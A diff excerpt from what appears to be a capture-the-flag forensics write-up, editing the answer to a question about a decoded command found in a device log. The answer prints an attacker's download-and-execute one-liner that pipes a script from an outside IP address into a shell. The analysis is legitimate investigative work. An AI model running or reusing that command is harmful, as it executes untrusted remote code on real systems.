@@ -211,7 +211,9 @@ Look at `redis.log`, we see they successfully push their command into Redis data
 
 ### 15. Once decoded, what is the command?
 
-Looking at the `bci-device.log`, we see the decoded command and its output. Hilariously, a stripped Linux version in those embedded system is often minimal, thus the result is just: wget is not available
+Looking at the `bci-device.log`, we see the decoded command and its output. Hilariously, a stripped Linux version in those embedded system is often minimal, thus the result is just: wget is not available:
+
+![](10.png)
 
 **Answer: `wget http://185.202.2.147/h4Pln4/run.sh -O- | sh`**
 
